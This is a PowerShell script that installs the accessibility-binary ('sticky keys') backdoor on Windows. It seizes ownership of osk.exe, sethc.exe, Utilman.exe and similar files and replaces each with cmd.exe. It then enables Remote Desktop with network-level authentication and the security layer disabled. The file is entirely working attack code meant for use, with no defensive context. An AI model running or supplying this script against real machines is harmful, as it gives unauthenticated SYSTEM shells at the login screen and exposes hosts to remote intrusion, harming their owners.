#Put binaries you want backdoored here
$bin = @("osk.exe","sethc.exe","Narrator.exe","Magnify.exe","Utilman.exe")

#go through each binary and then perform permission actions, move them, and then move cmd in their place
foreach ($element in $bin){

    Write-Host "[*] Backdooring $element" -ForegroundColor Green

    $Acl = Get-Acl "C:\Windows\System32\$element"
    $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","full","none","none","Allow")
    $Group = New-Object System.Security.Principal.NTAccount("Administrator")
    $Acl.SetOwner($Group)
    $Acl.AddAccessRule($Ar)
    Set-Acl -Path "C:\Windows\System32\$element" -AclObject $Acl
    Rename-Item -Path "C:\Windows\System32\$element" -NewName "C:\Windows\System32\old$element"
    Copy-Item "C:\Windows\System32\cmd.exe" -Destination "C:\Windows\System32\$element"

}

Write-Host "[*] Setting Up RDP" -ForegroundColor Green

#make userauth allowed
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name SecurityLayer -Value 0
